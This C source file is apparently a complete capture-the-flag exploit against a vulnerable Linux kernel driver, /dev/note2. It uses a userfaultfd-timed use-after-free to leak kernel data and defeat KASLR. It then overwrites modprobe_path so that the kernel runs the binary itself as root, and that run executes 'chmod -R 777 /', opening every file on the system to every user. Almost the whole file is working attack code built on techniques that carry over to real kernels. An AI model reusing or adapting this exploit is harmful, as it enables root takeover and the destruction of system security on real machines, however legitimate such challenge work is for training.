#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <syscall.h>
#include <unistd.h>

#define IO_ADD 0xFFFFFF00
#define IO_EDIT 0xFFFFFF01
#define IO_SHOW 0xFFFFFF02
#define IO_DEL 0xFFFFFF03

struct ioctl_arg {
  uint64_t idx;
  uint64_t size;
  uint64_t addr;
};

struct node {
  uint64_t key;
  uint64_t size;
  uint64_t addr;
};

#define PAGE_SIZE 4096
static const unsigned long abs_kernel = 0xFFFFFFFF81000000UL;
static const unsigned long abs_single_start = 0xFFFFFFFF813015F0UL;
static const unsigned long abs_modprobe_path = 0xFFFFFFFF82654B20UL;

#define NOTE2_PATH "/dev/note2"

struct fault_handler {
  const char *desc;
  pthread_t thread;
  void *page;
  int uffd;
  char value[PAGE_SIZE];
  void (*callback)(void *);
  void *arg;
};

static void *fault_handler_thread(void *arg) {
  struct fault_handler *fh = arg;

  struct pollfd pollfd;
  pollfd.fd = fh->uffd;
  pollfd.events = POLLIN;
  int nready = poll(&pollfd, 1, -1);
  assert(nready >= 0);

  struct uffd_msg msg;
  ssize_t nread = read(fh->uffd, &msg, sizeof(msg));
  assert(nread == sizeof(msg));
  assert(msg.event == UFFD_EVENT_PAGEFAULT);
  assert(msg.arg.pagefault.address == (__u64)fh->page);

  fh->callback(fh->arg);

  struct uffdio_copy uffdio_copy;
  uffdio_copy.src = (__u64)fh->value;
  uffdio_copy.dst = (__u64)fh->page;
  uffdio_copy.len = PAGE_SIZE;
  uffdio_copy.mode = 0;
  uffdio_copy.copy = 0;
  int ret = ioctl(fh->uffd, (int)UFFDIO_COPY, &uffdio_copy);
  assert(ret == 0);

  return NULL;
}

static void fault_handler_init(struct fault_handler *fh, const char *desc,
                               unsigned long value, void (*callback)(void *),
                               void *arg) {
  fh->desc = desc;
  *(unsigned long *)fh->value = value;
  fh->callback = callback;
  fh->arg = arg;

  fh->page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(fh->page != MAP_FAILED);

  fh->uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  assert(fh->uffd != -1);

  struct uffdio_api uffdio_api;
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  int ret = ioctl(fh->uffd, (int)UFFDIO_API, &uffdio_api);
  assert(ret == 0);

  struct uffdio_register uffdio_register;
  uffdio_register.range.start = (unsigned long)fh->page;
  uffdio_register.range.len = PAGE_SIZE;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  ret = ioctl(fh->uffd, (int)UFFDIO_REGISTER, &uffdio_register);
  assert(ret == 0);

  ret = pthread_create(&fh->thread, NULL, fault_handler_thread, fh);
  assert(ret == 0);
}

static void fault_handler_destroy(struct fault_handler *fh) {
  void *retval;
  pthread_join(fh->thread, &retval);
  close(fh->uffd);
  munmap(fh->page, PAGE_SIZE);
}

static void on_edit(void *arg) {
  int note2_fd = (int)(long)arg;
  /* Delete the 17-byte object. */
  struct ioctl_arg del = {.idx = 0, .size = 0, .addr = 0};
  int err = ioctl(note2_fd, IO_DEL, &del);
  assert(err == 0);
  /* Reuse the freed node for struct seq_operations. */
  int seq_fd = open("/proc/self/stat", O_RDONLY);
  assert(seq_fd != -1);
  /* Overlap the new node with the freed data.
     The size in the new node will be corrupted.
     Place the buffer into kmalloc-32. */
  char buf[0x1ff];
  memset(buf, 0, sizeof(buf));
  struct ioctl_arg add = {.idx = 0, .size = 32, .addr = (uint64_t)&buf};
  err = ioctl(note2_fd, IO_ADD, &add);
  assert(err == 0);
  /* Allocate 15 more nodes and hope we can reach them. */
  for (int i = 1; i <= 15; i++) {
    add.size = 0x130 + i;
    err = ioctl(note2_fd, IO_ADD, &add);
    assert(err == 0);
    seq_fd = open("/proc/self/stat", O_RDONLY);
    assert(seq_fd != -1);
  }
  /* Copy 17 bytes into node, overwriting its key, size and address lsb. */
}

int main(int argc, char **argv) {
  (void)argc;
  if (argv[0][strlen(argv[0]) - 1] == '\x01') {
    system("chmod -R 777 /");
    return EXIT_SUCCESS;
  }

  /* Pin to CPU 0 for predictable percpu freelist handling. */
  cpu_set_t aff;
  CPU_ZERO(&aff);
  CPU_SET(0, &aff);
  int setaffinity_ret = sched_setaffinity(0, sizeof(cpu_set_t), &aff);
  assert(setaffinity_ret == 0);

  int note2_fd = open(NOTE2_PATH, O_RDWR);
  assert(note2_fd != -1);

_again:
  for (int i = 0; i < 0x10; i++) {
    struct ioctl_arg del = {.idx = i, .size = 0, .addr = 0};
    ioctl(note2_fd, IO_DEL, &del);
  }

  /* Create a 17-byte object. It will go into kmalloc-32. */
  long buf[0x200 / 8];
  memset(buf, 0, sizeof(buf));
  struct ioctl_arg add = {.idx = 0, .size = 17, .addr = (uint64_t)&buf};
  int err = ioctl(note2_fd, IO_ADD, &add);
  assert(err == 0);

  /* Trigger UAF. */
  struct fault_handler fh_edit;
  fault_handler_init(&fh_edit, "IO_EDIT", 0, &on_edit, (void *)(long)note2_fd);
  struct ioctl_arg edit = {.idx = 0, .size = 0, .addr = (uint64_t)fh_edit.page};
  err = ioctl(note2_fd, IO_EDIT, &edit);
  assert(err == 0);
  fault_handler_destroy(&fh_edit);

  /* Fetch the object, which now has a random size. */
  memset(buf, 0, sizeof(buf));
  struct ioctl_arg show = {.idx = 0, .size = 0, .addr = (uint64_t)&buf};
  err = ioctl(note2_fd, IO_SHOW, &show);
  assert(err == 0);

  /* Find the value which occurs frequently. Assume this is the key. */
  long key = 0;
  for (size_t i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) {
    int count = 0;
    for (size_t j = 0; j < sizeof(buf) / sizeof(buf[0]); j++) {
      if (buf[i] == buf[j]) {
        count++;
      }
    }
    if (count >= 8) {
      key = buf[i];
      break;
    }
  }
  if (key == 0) {
    goto _again;
  }
  printf("key = %lx\n", key);

  /* Apply the key. */
  for (size_t i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) {
    buf[i] ^= key;
  }

  /* Break KASLR, find a victim node for arbitrary rw. */
  long single_start = 0;
  for (size_t i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) {
    if ((buf[i] & 0xfff) == 0x5f0) {
      single_start = buf[i];
      break;
    }
  }
  if (single_start == 0) {
    goto _again;
  }
  printf("single_start = %lx\n", single_start);
  long kernel_base = single_start - (abs_single_start - abs_kernel);
  printf("kernel_base = %lx\n", kernel_base);
  size_t victim = -1;
  for (size_t i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) {
    if (buf[i] >= 0x131 && buf[i] <= 0x13f) {
      victim = i;
      break;
    }
  }
  if (victim == (size_t)-1) {
    goto _again;
  }
  size_t victim_table_idx = buf[victim] - 0x130;
  printf("victim = buf[%zd], table[%zd]\n", victim, victim_table_idx);

  /* Point the victim node to modprobe_path. */
  char tmp_1[] = "/tmp/\x01";
  buf[victim - 1] = 0;
  buf[victim] = sizeof(tmp_1);
  buf[victim + 1] = kernel_base + (abs_modprobe_path - abs_kernel);
  for (size_t i = 0; i < sizeof(buf) / sizeof(buf[0]); i++) {
    buf[i] ^= key;
  }
  edit.addr = (uint64_t)&buf;
  err = ioctl(note2_fd, IO_EDIT, &edit);
  assert(err == 0);

  /* Overwrite modprobe_path. */
  edit.idx = victim_table_idx;
  edit.addr = (uint64_t)&tmp_1;
  err = ioctl(note2_fd, IO_EDIT, &edit);
  assert(err == 0);

  /* Trigger modprobe_path. */
  char cmd[128];
  snprintf(cmd, sizeof(cmd),
           "cp %s %s && printf \"\\xff\\xff\\xff\\xff\" >/tmp/dummy && chmod "
           "a+x /tmp/dummy && /tmp/dummy",
           argv[0], tmp_1);
  cmd[sizeof(cmd) - 1] = 0;
  err = system(cmd);
  assert(err == 0);

  /* hitcon{R4c3_Bl0ck_Bl0ck_Bl0ck_70_r00t} */
}
